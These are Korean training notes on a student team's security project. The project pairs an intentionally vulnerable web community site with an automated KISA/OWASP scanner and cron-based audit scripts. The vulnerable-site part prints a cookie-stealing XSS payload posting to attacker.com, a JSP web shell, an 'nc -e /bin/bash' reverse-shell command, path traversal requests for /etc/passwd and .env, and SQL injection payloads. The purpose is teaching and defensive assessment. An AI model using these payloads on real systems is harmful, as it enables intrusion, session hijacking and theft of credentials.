<!-- 로그인 폼 -->
<form action="/login" method="POST">
    <input type="text" name="username" placeholder="아이디">
    <input type="password" name="password" placeholder="비밀번호">
    <button type="submit">로그인</button>
</form>
```

**내장된 취약점**:
- SQL Injection (인증 우회)
- 세션 고정 (Session Fixation)
- 브루트포스 공격 방어 미흡

#### 2. 게시판 시스템

발표 내용:

> "게시글에 **스크립트를 주입해서 쿠키 탈취**와 같은 취약점..."

**XSS (Stored) 취약점**:
```javascript
// 공격자가 게시글에 삽입하는 악성 스크립트
<script>
    // 쿠키 탈취
    var stolenCookie = document.cookie;

    // 공격자 서버로 전송
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({
            cookie: stolenCookie,
            url: window.location.href,
            user: document.getElementById('username').textContent
        })
    });
</script>
```

**2차 공격 (Stored XSS의 위험성)**:
```
공격자가 게시글에 악성 스크립트 삽입
   ↓
다른 사용자(피해자)가 게시글 조회
   ↓
피해자의 브라우저에서 스크립트 자동 실행
   ↓
피해자의 세션 쿠키가 공격자에게 전송
   ↓
공격자가 피해자 계정으로 로그인 (세션 하이재킹)
   ↓
관리자 계정이 탈취되면 전체 사이트 장악 가능
```

#### 3. 파일 업로드/다운로드

발표 내용:

> "그리고 게시판에 **웹쉘을 업로드** 하거나 **다운로드 경로를 조작해서 시스템의 주요 설정 파일을 탈취**하는 취약점 등이 있습니다."

**웹쉘 업로드 취약점**:
```jsp
<%-- 악성 웹쉘 (shell.jsp) --%>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
```

**공격 시나리오**:
```bash
# 1. 웹쉘을 이미지로 위장하여 업로드
shell.jsp → shell.jsp.png (확장자만 변경)

# 2. 업로드 성공 시 웹쉘 접근
http://community.com/uploads/shell.jsp?cmd=whoami

# 3. 서버 명령 실행
http://community.com/uploads/shell.jsp?cmd=cat /etc/passwd
http://community.com/uploads/shell.jsp?cmd=ls -la /var/www/html

# 4. 백도어 설치
http://community.com/uploads/shell.jsp?cmd=nc -e /bin/bash attacker.com 4444
```

**Path Traversal (경로 조작)**:
```java
// 취약한 파일 다운로드 코드
@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
    // 취약점: 경로 검증 없음
    File file = new File("/uploads/" + filename);
    Resource resource = new FileSystemResource(file);
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + filename + "\"")
        .body(resource);
}
```

**공격**:
```bash
# 정상적인 다운로드
GET /download?filename=document.pdf

# 경로 조작 공격
GET /download?filename=../../../../etc/passwd
GET /download?filename=../../config/application.properties  # DB 접속 정보
GET /download?filename=../../../.env  # 환경 변수
GET /download?filename=../../WEB-INF/web.xml  # 웹 애플리케이션 설정
```

#### 4. 관리자 페이지

발표 내용:

> "**관리자 페이지에 접근할 수 있는 취약점**이 있고..."

**권한 검증 미흡 (IDOR + 권한 상승)**:
```java
// 취약한 관리자 페이지
@GetMapping("/admin/users")
public String adminUserList(Model model) {
    // 취약점: 권한 검증 없음
    List<User> users = userService.findAll();
    model.addAttribute("users", users);
    return "admin/userList";
}
```

**쿠키 조작을 통한 권한 상승**:
```javascript
// 공격자가 브라우저 개발자 도구에서 쿠키 변조
document.cookie = "role=admin; path=/";

// 또는
document.cookie = "isAdmin=true; path=/";

// 이후 관리자 페이지 접근 시도
// 서버에서 쿠키 값만 체크하면 접근 성공!
```

### 4.2.3 의도적으로 내장된 취약점 요약

| 순번 | 취약점 유형 | 위치 | 심각도 | OWASP Top 10 |
|------|-----------|------|--------|--------------|
| 1 | 관리자 페이지 접근 | /admin/* | Critical | A01 Broken Access Control |
| 2 | 게시판 XSS (Stored) | 게시글, 댓글 | High | A03 Injection |
| 3 | 웹쉘 업로드 | 파일 업로드 기능 | Critical | A04 Insecure Design |
| 4 | Path Traversal | 파일 다운로드 | High | A01 Broken Access Control |
| 5 | SQL Injection | 로그인, 검색 | Critical | A03 Injection |
| 6 | 세션 고정 | 로그인 프로세스 | Medium | A07 Authentication Failures |
| 7 | CSRF | 게시글 작성, 삭제 | Medium | A01 Broken Access Control |
| 8 | 정보 노출 | 에러 페이지 | Low | A05 Security Misconfiguration |

---

## 4.3 진단 시스템 아키텍처

### 4.3.1 시스템 구조

발표 내용:

> "진단 시스템 쪽인데요. 진단 서버는 **리눅스 기반**이고, **대상 서버와 원격 통신**을 해서
> **키사, 오와스프 기반 스크립트를 자동으로 시행**을 해줍니다."

**3-Tier 진단 아키텍처**:

```
┌─────────────────────────────────────┐
│  사용자 (웹 브라우저)               │
│  - 대시보드 접근                    │
│  - 진단 실행                        │
└─────────────────────────────────────┘
         ↓ HTTPS
┌─────────────────────────────────────┐
│  진단 서버 (Diagnosis Server)       │
│  - Linux 기반                       │
│  - 웹 인터페이스 제공               │
│  - 스크립트 실행 엔진               │
│  - 결과 DB 저장                     │
└─────────────────────────────────────┘
         ↓ SSH / HTTP
┌─────────────────────────────────────┐
│  대상 서버 (Target Server)          │
│  - 보안 커뮤니티 사이트             │
│  - 웹/WAS/DB 서버                   │
└─────────────────────────────────────┘
```

### 4.3.2 진단 서버 특징

발표 내용:

> "진단 서버의 특징은 **원격 취약점 스캐닝**, 그리고 **결과를 실시간으로 로그인하고 DB에 저장**,
> **대시보드를 제공해서 현황을 한눈에 파악**할 수 있도록 해줍니다."

#### 1. 원격 취약점 스캐닝

**SSH 기반 원격 점검**:
```python
import paramiko

class RemoteScanner:
    """
    SSH를 통한 원격 서버 점검
    """

    def __init__(self, host, port, username, key_file):
        self.host = host
        self.port = port
        self.username = username
        self.key_file = key_file
        self.client = None

    def connect(self):
        """SSH 연결"""
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # 키 기반 인증
        private_key = paramiko.RSAKey.from_private_key_file(self.key_file)
        self.client.connect(
            hostname=self.host,
            port=self.port,
            username=self.username,
            pkey=private_key
        )

    def execute_check(self, command):
        """원격 명령 실행"""
        stdin, stdout, stderr = self.client.exec_command(command)
        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')

        return {
            'output': output,
            'error': error,
            'exit_code': stdout.channel.recv_exit_status()
        }

    def check_os_security(self):
        """OS 보안 점검"""
        checks = []

        # 1. 계정 점검
        result = self.execute_check("cat /etc/passwd")
        checks.append(self._analyze_accounts(result['output']))

        # 2. 권한 점검
        result = self.execute_check("find / -perm -4000 2>/dev/null")
        checks.append(self._analyze_suid(result['output']))

        # 3. 방화벽 점검
        result = self.execute_check("iptables -L -n")
        checks.append(self._analyze_firewall(result['output']))

        return checks
```

**HTTP 기반 웹 스캐닝**:
```python
import requests

class WebScanner:
    """
    HTTP를 통한 웹 취약점 스캔
    """

    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def scan_sql_injection(self, endpoints):
        """SQL Injection 스캔"""
        payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
        results = []

        for endpoint in endpoints:
            for payload in payloads:
                url = f"{self.target_url}{endpoint}"
                response = self.session.post(url, data={'username': payload, 'password': 'test'})

                if self._detect_sqli(response):
                    results.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'vulnerable': True
                    })

        return results
```

#### 2. 실시간 로깅 및 DB 저장

**진단 결과 실시간 저장**:
```python
import sqlite3
from datetime import datetime

class DiagnosisLogger:
    """
    진단 결과 DB 저장 및 로깅
    """

    def __init__(self, db_path='diagnosis.db'):
        self.conn = sqlite3.connect(db_path)
        self._create_tables()

    def _create_tables(self):
        """테이블 생성"""
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS scan_sessions (
                session_id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                start_time TIMESTAMP NOT NULL,
                end_time TIMESTAMP,
                status TEXT,
                total_checks INTEGER,
                vulnerable_checks INTEGER
            )
        ''')

        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                result_id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                check_category TEXT,  -- 웹/OS/DB
                check_name TEXT,
                severity TEXT,  -- Critical/High/Medium/Low
                vulnerable BOOLEAN,
                evidence TEXT,
                recommendation TEXT,
                timestamp TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES scan_sessions(session_id)
            )
        ''')

        self.conn.commit()

    def log_check_result(self, session_id, check_data):
        """점검 결과 로깅"""
        self.conn.execute('''
            INSERT INTO scan_results
            (session_id, check_category, check_name, severity, vulnerable, evidence, recommendation, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            session_id,
            check_data['category'],
            check_data['name'],
            check_data['severity'],
            check_data['vulnerable'],
            check_data.get('evidence', ''),
            check_data.get('recommendation', ''),
            datetime.now()
        ))
        self.conn.commit()

        # 실시간 로그 출력
        status = "[취약]" if check_data['vulnerable'] else "[안전]"
        print(f"{status} [{check_data['category']}] {check_data['name']}")
```

#### 3. 대시보드 제공

발표 내용:

> "사이트에 들어가면 일단 먼저 **이렇게 로그인 화면**이 먼저 뜨구요. 안에 들어가시면 이렇게 **대시보드를 확인**할 수 있습니다.
> 사진상 잘 안보실 수도 있는데, **웹, 시스템, DB, 총 3가지의 취약점 대시보드**로 나눠져 있습니다."

**대시보드 구성 (3가지 카테고리)**:

```markdown
## 1. 웹 취약점 대시보드
┌─────────────────────────────────────┐
│  웹 보안 현황                        │
├─────────────────────────────────────┤
│  총 점검 항목: 18개                 │
│  취약: 4개      안전: 14개          │
│  취약율: 22.2%                      │
│                                      │
│  심각도별 분류:                      │
│  - Critical: 1건 (SQL Injection)    │
│  - High: 2건 (XSS, Path Traversal) │
│  - Medium: 1건 (CSRF)               │
│                                      │
│  최근 스캔: 2026-01-06 14:30       │
│  [상세 보기] [재스캔]               │
└─────────────────────────────────────┘

## 2. 시스템(OS) 취약점 대시보드
┌─────────────────────────────────────┐
│  시스템 보안 현황                    │
├─────────────────────────────────────┤
│  총 점검 항목: 67개                 │
│  취약: 6개      안전: 61개          │
│  취약율: 9.0%                       │
│                                      │
│  주요 취약점:                        │
│  - 비밀번호 정책 미흡               │
│  - SUID 파일 과다                   │
│  - 불필요한 포트 개방               │
│                                      │
│  최근 스캔: 2026-01-06 14:35       │
│  [상세 보기] [재스캔]               │
└─────────────────────────────────────┘

## 3. DB 취약점 대시보드
┌─────────────────────────────────────┐
│  데이터베이스 보안 현황              │
├─────────────────────────────────────┤
│  총 점검 항목: 26개                 │
│  취약: 3개      안전: 23개          │
│  취약율: 11.5%                      │
│                                      │
│  주요 취약점:                        │
│  - 원격 접속 허용                    │
│  - 기본 계정 활성화                  │
│  - 감사 로그 미설정                  │
│                                      │
│  최근 스캔: 2026-01-06 14:40       │
│  [상세 보기] [재스캔]               │
└─────────────────────────────────────┘
```

**대시보드 기능**:

> "**해당 대시보드들은 취약점의 심각도를 식별하고 상세 진단 이력을 추적**해서
> **보안 대응의 우선순위 결정을 돕도록** 설정을 했습니다."

1. **시각적 현황 파악**: 파이 차트, 막대 그래프로 즉시 이해
2. **심각도 분류**: Critical/High/Medium/Low 자동 분류
3. **이력 추적**: 과거 스캔 결과와 비교 분석
4. **우선순위 제시**: 심각도와 발견 빈도 기반 우선순위 자동 산정

**대시보드 구현 (Flask + Chart.js 예시)**:
```python
from flask import Flask, render_template, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/dashboard')
def dashboard():
    """대시보드 메인 페이지"""
    return render_template('dashboard.html')

@app.route('/api/dashboard/web')
def get_web_dashboard_data():
    """웹 대시보드 데이터 API"""
    conn = sqlite3.connect('diagnosis.db')
    cursor = conn.cursor()

    # 최근 스캔 세션 조회
    cursor.execute('''
        SELECT session_id FROM scan_sessions
        WHERE target_url LIKE '%community%'
        ORDER BY start_time DESC LIMIT 1
    ''')
    session_id = cursor.fetchone()[0]

    # 웹 취약점 통계
    cursor.execute('''
        SELECT
            COUNT(*) as total,
            SUM(CASE WHEN vulnerable = 1 THEN 1 ELSE 0 END) as vulnerable,
            SUM(CASE WHEN vulnerable = 0 THEN 1 ELSE 0 END) as safe
        FROM scan_results
        WHERE session_id = ? AND check_category = '웹'
    ''', (session_id,))

    stats = cursor.fetchone()

    # 심각도별 분류
    cursor.execute('''
        SELECT severity, COUNT(*) as count
        FROM scan_results
        WHERE session_id = ? AND check_category = '웹' AND vulnerable = 1
        GROUP BY severity
    ''', (session_id,))

    severity_data = {row[0]: row[1] for row in cursor.fetchall()}

    conn.close()

    return jsonify({
        'total': stats[0],
        'vulnerable': stats[1],
        'safe': stats[2],
        'vulnerability_rate': (stats[1] / stats[0] * 100) if stats[0] > 0 else 0,
        'severity': severity_data
    })
```

---

## 4.4 대상 서버 추가 및 관리

### 4.4.1 대상 추가 인터페이스

발표 내용:

> "다음은 대상 추가입니다. 저희가 **진단할 대상을 추가할 수 있는 곳**이구요.
> **대상 관리 탭에서 관리하고 있는 대상명, URL, IP 등을 확인**할 수 있고
> **직접 대상을 추가할 수 있는 기능**입니다."

**대상 추가 폼**:
```html
<form action="/targets/add" method="POST">
    <div class="form-group">
        <label>대상명</label>
        <input type="text" name="target_name" placeholder="보안 커뮤니티 사이트" required>
    </div>

    <div class="form-group">
        <label>URL</label>
        <input type="url" name="target_url" placeholder="https://community.example.com" required>
    </div>

    <div class="form-group">
        <label>IP 주소</label>
        <input type="text" name="target_ip" placeholder="192.168.1.100" required>
    </div>

    <div class="form-group">
        <label>SSH 접속 정보 (선택)</label>
        <input type="text" name="ssh_user" placeholder="ubuntu">
        <input type="number" name="ssh_port" placeholder="22" value="22">
        <input type="file" name="ssh_key" accept=".pem">
    </div>

    <div class="form-group">
        <label>설명</label>
        <textarea name="description" placeholder="대상 서버에 대한 설명"></textarea>
    </div>

    <div class="form-group">
        <label>담당자</label>
        <input type="text" name="manager" placeholder="홍길동">
    </div>

    <button type="submit">대상 추가</button>
</form>
```

**대상 목록 조회**:
```python
@app.route('/targets')
def list_targets():
    """진단 대상 목록"""
    conn = sqlite3.connect('diagnosis.db')
    cursor = conn.cursor()

    cursor.execute('''
        SELECT
            target_id,
            target_name,
            target_url,
            target_ip,
            manager,
            last_scan_time,
            vulnerability_count
        FROM diagnosis_targets
        ORDER BY last_scan_time DESC
    ''')

    targets = cursor.fetchall()
    conn.close()

    return render_template('targets.html', targets=targets)
```

### 4.4.2 진단 실행 프로세스

발표 내용:

> "진단 시행 부분입니다. 저희는 총 **2단계로 진단을 시행**을 하는데,
> **1단계로 먼저 타겟 사이트에 크롤링해서 URL을 수집**을 하고,
> **2단계에서 수집된 URL 전체에 대해서 선택한 취약점 항목을 검사**를 합니다."

**2단계 진단 프로세스**:

```
┌──────────────────────────────────────┐
│  1단계: URL 수집 (크롤링)            │
├──────────────────────────────────────┤
│  - 시작 URL에서 링크 추출            │
│  - 재귀적으로 모든 페이지 탐색       │
│  - 폼 요소 및 파라미터 수집          │
│  - 진단 대상 목록 생성               │
└──────────────────────────────────────┘
         ↓
┌──────────────────────────────────────┐
│  2단계: 취약점 스캔                  │
├──────────────────────────────────────┤
│  - 수집된 URL별로 취약점 검사        │
│  - 선택된 스캔 항목만 실행           │
│  - 실시간 결과 저장 및 로깅          │
│  - 완료 후 리포트 생성               │
└──────────────────────────────────────┘
```

**1단계: 웹 크롤러 구현**:
```python
from bs4 import BeautifulSoup
import requests
from urllib.parse import urljoin, urlparse

class WebCrawler:
    """
    웹 사이트 크롤링 및 URL 수집
    """

    def __init__(self, start_url, max_depth=3):
        self.start_url = start_url
        self.max_depth = max_depth
        self.visited = set()
        self.urls = []
        self.forms = []

    def crawl(self):
        """크롤링 시작"""
        print(f"[*] 크롤링 시작: {self.start_url}")
        self._crawl_recursive(self.start_url, depth=0)
        print(f"[+] 크롤링 완료: {len(self.urls)}개 URL, {len(self.forms)}개 폼 발견")
        return {
            'urls': list(self.urls),
            'forms': self.forms
        }

    def _crawl_recursive(self, url, depth):
        """재귀적 크롤링"""
        if depth > self.max_depth or url in self.visited:
            return

        self.visited.add(url)
        print(f"  [Depth {depth}] {url}")

        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # 폼 추출
            forms = soup.find_all('form')
            for form in forms:
                self.forms.append(self._parse_form(form, url))

            # 링크 추출
            for link in soup.find_all('a', href=True):
                next_url = urljoin(url, link['href'])

                # 같은 도메인만 크롤링
                if self._is_same_domain(next_url, self.start_url):
                    self.urls.add(next_url)
                    self._crawl_recursive(next_url, depth + 1)

        except Exception as e:
            print(f"  [!] 에러: {e}")

    def _parse_form(self, form, base_url):
        """폼 정보 파싱"""
        action = form.get('action', '')
        method = form.get('method', 'get').upper()
        inputs = []

        for input_tag in form.find_all(['input', 'textarea', 'select']):
            inputs.append({
                'name': input_tag.get('name'),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            })

        return {
            'action': urljoin(base_url, action),
            'method': method,
            'inputs': inputs
        }

    def _is_same_domain(self, url1, url2):
        """동일 도메인 확인"""
        return urlparse(url1).netloc == urlparse(url2).netloc
```

**2단계: 취약점 스캔 실행**:
```python
@app.route('/scan/execute', methods=['POST'])
def execute_scan():
    """진단 실행"""
    target_id = request.form['target_id']
    selected_checks = request.form.getlist('checks')  # 선택된 점검 항목

    # 대상 정보 조회
    target = get_target_by_id(target_id)

    # 스캔 세션 생성
    session_id = create_scan_session(target['url'])

    # 1단계: 크롤링
    crawler = WebCrawler(target['url'])
    crawl_results = crawler.crawl()

    # 2단계: 선택된 항목만 스캔
    scanner = VulnerabilityScanner(target['url'])

    for check in selected_checks:
        if check == 'sql_injection':
            results = scanner.scan_sql_injection(crawl_results['forms'])
        elif check == 'xss':
            results = scanner.scan_xss(crawl_results['forms'])
        elif check == 'csrf':
            results = scanner.scan_csrf(crawl_results['forms'])
        # ...

        # 결과 저장
        for result in results:
            log_check_result(session_id, result)

    # 스캔 완료
    update_scan_session(session_id, status='completed')

    return jsonify({'session_id': session_id, 'status': 'success'})
```

---

## 4.5 시스템 및 DBMS 진단

### 4.5.1 시스템 취약점 진단

발표 내용:

> "그 다음에 시스템 취약점인데요. 시스템 진단은 **원격에서 진단을 하려 했으나**,
> **원격에서 쉘을 시행시킨다는 것 자체가 매우 심각한 취약점이고 매우 위험할 수 있다**고 생각을 해서,
> 저희는 **대상 서버에 점검용 쉘을 넣어두고**, **크론으로 주기적으로 실행하게 한 뒤에**
> **JSON 리포트로 진단 서버에 전송을 해서 DB 저장 및 대시보드에서 확인하는 구조**로 설계를 했습니다."

**보안을 고려한 설계 결정**:

| 방식 | 장점 | 단점 | 1조의 선택 |
|------|------|------|-----------|
| 원격 쉘 실행 | - 중앙 집중 관리<br>- 실시간 점검 가능 | - **심각한 보안 위협**<br>- 원격 코드 실행 취약점 | ❌ 채택 안 함 |
| 로컬 스크립트 + 전송 | - 보안성 높음<br>- 대상 서버 제어 유지 | - 초기 설치 필요<br>- 주기적 실행 필요 | ✅ 채택 |

**크론 기반 자동 점검 구조**:

```
대상 서버 (Target Server)
┌─────────────────────────────────────┐
│  /opt/security-scanner/             │
│  ├── scan.sh          # 메인 스크립트
│  ├── checks/          # 점검 모듈   │
│  │   ├── 01_account.sh              │
│  │   ├── 02_password.sh             │
│  │   ├── 03_file_perm.sh            │
│  │   └── ...                         │
│  └── send_report.sh   # 결과 전송   │
└─────────────────────────────────────┘
         ↓ Cron (매일 02:00)
         ↓ ./scan.sh 실행
         ↓ JSON 리포트 생성
         ↓ ./send_report.sh
         ↓ HTTP POST
         ↓
┌─────────────────────────────────────┐
│  진단 서버 (Diagnosis Server)       │
│  POST /api/reports/upload           │
│  - JSON 수신                        │
│  - DB 저장                          │
│  - 대시보드 업데이트                │
└─────────────────────────────────────┘
```

**scan.sh 메인 스크립트**:
```bash
#!/bin/bash

# 보안 점검 메인 스크립트

SCRIPT_DIR="/opt/security-scanner"
REPORT_DIR="${SCRIPT_DIR}/reports"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
REPORT_FILE="${REPORT_DIR}/scan_${TIMESTAMP}.json"

echo "[*] 보안 점검 시작: $(date)"

# JSON 리포트 헤더
cat > ${REPORT_FILE} <<EOF
{
  "scan_time": "$(date -Iseconds)",
  "hostname": "$(hostname)",
  "ip_address": "$(hostname -I | awk '{print $1}')",
  "checks": [
EOF

# checks 디렉토리의 모든 스크립트 실행
first=true
for check_script in ${SCRIPT_DIR}/checks/*.sh; do
    if [ "$first" = false ]; then
        echo "," >> ${REPORT_FILE}
    fi
    first=false

    # 각 점검 스크립트 실행
    bash ${check_script} >> ${REPORT_FILE}
done

# JSON 리포트 푸터
cat >> ${REPORT_FILE} <<EOF
  ]
}
EOF

echo "[+] 보안 점검 완료"
echo "[*] 리포트 파일: ${REPORT_FILE}"

# 리포트 전송
${SCRIPT_DIR}/send_report.sh ${REPORT_FILE}
```

**개별 점검 스크립트 예시 (01_account.sh)**:
```bash
#!/bin/bash

# U-01: root 원격 접속 제한

check_root_remote_login() {
    local result="양호"
    local evidence=""

    # /etc/ssh/sshd_config 확인
    permit_root=$(grep "^PermitRootLogin" /etc/ssh/sshd_config | awk '{print $2}')

    if [ "$permit_root" = "yes" ]; then
        result="취약"
        evidence="PermitRootLogin이 yes로 설정됨"
    fi

    # JSON 출력
    cat <<EOF
    {
      "check_id": "U-01",
      "check_name": "root 계정 원격 접속 제한",
      "category": "계정관리",
      "severity": "High",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "PermitRootLogin을 no로 설정"
    }
EOF
}

# 함수 실행
check_root_remote_login
```

**send_report.sh (리포트 전송 스크립트)**:
```bash
#!/bin/bash

REPORT_FILE=$1
DIAGNOSIS_SERVER="https://diagnosis-server.com"
API_KEY="your-api-key-here"

# 리포트 전송
curl -X POST "${DIAGNOSIS_SERVER}/api/reports/upload" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${API_KEY}" \
    -d @${REPORT_FILE}

if [ $? -eq 0 ]; then
    echo "[+] 리포트 전송 성공"
else
    echo "[!] 리포트 전송 실패"
fi
```

**크론탭 설정**:
```bash
# crontab -e

# 매일 새벽 2시에 보안 점검 실행
0 2 * * * /opt/security-scanner/scan.sh >> /var/log/security-scan.log 2>&1

# 매주 월요일 오전 9시에 추가 점검
0 9 * * 1 /opt/security-scanner/scan.sh >> /var/log/security-scan.log 2>&1
```

**강사의 추가 질문 및 답변**:

**질문**:
> "근데 이게 구현 잘해졌고 지금 어떤 식으로 구현했는지는 알 것 같은데
> 크론으로 주기적으로 실행하게 한 뒤에 제이슨 리포트로 진단 서버에 전송을 해서 DB 저장 및 대시보드에서 확인하는 구조로 설계를 했습니다.
> **이 방식이 원쪽에서 이메의 명령을 던지는 형태보다 운영 환경에서 부담이 적다고 생각**을 했습니다."

**답변 (1조의 설계 철학)**:
- 대상 서버가 주도권 유지 (Pull 방식 vs Push 방식)
- 원격 코드 실행 취약점 원천 차단
- 네트워크 방화벽 정책 간소화 (Outbound만 허용)
- 감사 추적 용이 (대상 서버에 로그 보존)

### 4.5.2 DBMS 진단

> "dbms도 마찬가지로 주통기를 기준으로 제작을 했습니다."

**DBMS 점검 방식**:
- OS 점검과 동일하게 로컬 스크립트 방식
- MySQL 점검 전용 스크립트
- JSON 리포트로 결과 전송

**DBMS 점검 스크립트 예시**:
```bash
#!/bin/bash

# D-01: 기본 계정 존재 여부

check_default_accounts() {
    local result="양호"
    local evidence=""

    # MySQL 접속
    mysql -u root -p${MYSQL_ROOT_PASSWORD} -e "SELECT User, Host FROM mysql.user;" > /tmp/mysql_users.txt

    # 기본 계정 확인
    if grep -q "test" /tmp/mysql_users.txt; then
        result="취약"
        evidence="test 계정이 존재함"
    fi

    cat <<EOF
    {
      "check_id": "D-01",
      "check_name": "불필요한 계정 존재 여부",
      "category": "계정관리",
      "severity": "Medium",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "test 계정 삭제 필요"
    }
EOF
}

check_default_accounts
```

---

**(section4_team1.md 계속 - Part 2로 분할 예정)**
# Section 4: 2조 + 1조 프로젝트 (Part 2)

## 4.5 시스템 및 DBMS 진단 (계속)

### 4.5.2 DBMS 진단 스크립트 구조

시스템 진단과 동일하게 DBMS 진단도 **로컬 실행 + JSON 전송** 방식으로 설계되었습니다. 원격에서 데이터베이스에 직접 연결하여 쿼리를 실행하는 것은 보안상 위험하므로, 대상 서버에 진단 스크립트를 배치하고 Cron으로 주기적으로 실행하는 방식을 채택했습니다.

#### DBMS 진단 스크립트 구조

```bash
/opt/security_check/dbms/
├── scan_dbms.sh           # DBMS 진단 메인 스크립트
├── checks/                # 개별 점검 스크립트 디렉터리
│   ├── D-01_default_accounts.sh
│   ├── D-02_password_policy.sh
│   ├── D-03_privilege_check.sh
│   ├── D-04_remote_access.sh
│   ├── D-05_audit_log.sh
│   ├── D-06_encryption.sh
│   ├── D-07_backup_check.sh
│   ├── D-08_version_patch.sh
│   ├── D-09_file_permission.sh
│   └── ... (총 26개 점검 항목)
├── send_report.sh         # 진단 결과 전송 스크립트
└── config.sh              # 설정 파일 (DB 접속 정보 등)
```

#### scan_dbms.sh - DBMS 진단 메인 스크립트

```bash
#!/bin/bash

# 환경 설정
SCRIPT_DIR="/opt/security_check/dbms"
REPORT_DIR="/opt/security_check/reports/dbms"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
REPORT_FILE="${REPORT_DIR}/dbms_scan_${TIMESTAMP}.json"

# 설정 파일 로드
source ${SCRIPT_DIR}/config.sh

# 리포트 디렉터리 생성
mkdir -p ${REPORT_DIR}

# JSON 리포트 시작
cat <<EOF > ${REPORT_FILE}
{
  "scan_type": "DBMS",
  "scan_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "target_host": "$(hostname)",
  "target_db": "${DB_NAME}",
  "db_version": "$(mysql --version | awk '{print $5}')",
  "total_checks": 26,
  "checks": [
EOF

# 모든 점검 스크립트 실행
first=true
for check_script in ${SCRIPT_DIR}/checks/*.sh; do
    if [ -f "$check_script" ]; then
        if [ "$first" = false ]; then
            echo "," >> ${REPORT_FILE}
        fi
        first=false

        # 각 점검 스크립트 실행하고 결과를 JSON에 추가
        bash ${check_script} >> ${REPORT_FILE}
    fi
done

# JSON 리포트 종료
cat <<EOF >> ${REPORT_FILE}
  ],
  "summary": {
    "vulnerable": $(grep -c '"result": "취약"' ${REPORT_FILE}),
    "safe": $(grep -c '"result": "양호"' ${REPORT_FILE}),
    "warning": $(grep -c '"result": "경고"' ${REPORT_FILE})
  }
}
EOF

# 리포트 파일 권한 설정
chmod 600 ${REPORT_FILE}

# 진단 서버로 리포트 전송
${SCRIPT_DIR}/send_report.sh ${REPORT_FILE}

# 로그 기록
logger "DBMS security scan completed: ${REPORT_FILE}"
```

#### D-01_default_accounts.sh - 기본 계정 존재 여부 점검

```bash
#!/bin/bash

# 설정 파일 로드
source /opt/security_check/dbms/config.sh

check_default_accounts() {
    local result="양호"
    local evidence=""
    local recommendation=""

    # MySQL 사용자 목록 조회
    mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SELECT User, Host FROM mysql.user;" > /tmp/mysql_users.txt 2>/dev/null

    # 기본 계정 존재 여부 확인
    if grep -qE "^test|^guest|^demo" /tmp/mysql_users.txt; then
        result="취약"
        evidence="불필요한 기본 계정이 존재함: $(grep -E '^test|^guest|^demo' /tmp/mysql_users.txt | awk '{print $1}' | tr '\n' ', ')"
        recommendation="불필요한 계정 삭제: DROP USER 'test'@'localhost';"
    else
        evidence="불필요한 기본 계정이 존재하지 않음"
        recommendation="현재 상태 유지"
    fi

    # 익명 사용자 확인
    if grep -q "^''" /tmp/mysql_users.txt; then
        result="취약"
        evidence="${evidence} / 익명 사용자가 존재함"
        recommendation="${recommendation} / 익명 사용자 삭제: DELETE FROM mysql.user WHERE User='';"
    fi

    # 임시 파일 삭제
    rm -f /tmp/mysql_users.txt

    # JSON 형식으로 출력
    cat <<EOF
    {
      "check_id": "D-01",
      "check_name": "불필요한 계정 존재 여부",
      "category": "계정관리",
      "severity": "High",
      "kisa_reference": "KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드 D-01",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "${recommendation}",
      "command_used": "SELECT User, Host FROM mysql.user;"
    }
EOF
}

# 점검 함수 실행
check_default_accounts
```

#### D-02_password_policy.sh - 패스워드 정책 점검

```bash
#!/bin/bash

source /opt/security_check/dbms/config.sh

check_password_policy() {
    local result="양호"
    local evidence=""
    local recommendation=""

    # validate_password 플러그인 설치 여부 확인
    validate_plugin=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW PLUGINS;" | grep validate_password)

    if [ -z "$validate_plugin" ]; then
        result="취약"
        evidence="비밀번호 검증 플러그인이 설치되지 않음"
        recommendation="validate_password 플러그인 설치 및 활성화: INSTALL PLUGIN validate_password SONAME 'validate_password.so';"
    else
        # 비밀번호 정책 변수 확인
        policy_length=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'validate_password_length';" | awk 'NR==2 {print $2}')
        policy_mixed=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'validate_password_mixed_case_count';" | awk 'NR==2 {print $2}')
        policy_number=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'validate_password_number_count';" | awk 'NR==2 {print $2}')
